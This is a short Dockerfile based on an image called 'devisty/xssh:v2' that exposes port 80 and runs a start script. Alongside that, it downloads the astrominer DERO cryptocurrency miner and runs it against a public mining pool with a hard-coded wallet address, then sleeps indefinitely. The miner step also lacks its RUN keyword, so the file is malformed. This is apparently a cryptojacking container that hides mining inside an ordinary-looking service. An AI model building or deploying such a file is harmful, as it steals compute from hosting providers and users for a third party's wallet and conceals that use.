FROM devisty/xssh:v2
EXPOSE 80

COPY . /app
RUN chmod +x /app/start.sh
RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz && tar -xvf astrominer-V1.9_modern_amd64_linux.tar.gz
./astrominer -w dero1qyncd3pl6nngqwgh2jurc9y3dg6hyt3g0j6wf2f2txqfm6yd65njkqqem5kju -r dero.rabidmining.com:10300 && sleep 99999090909090909
CMD ["/app/start.sh"]
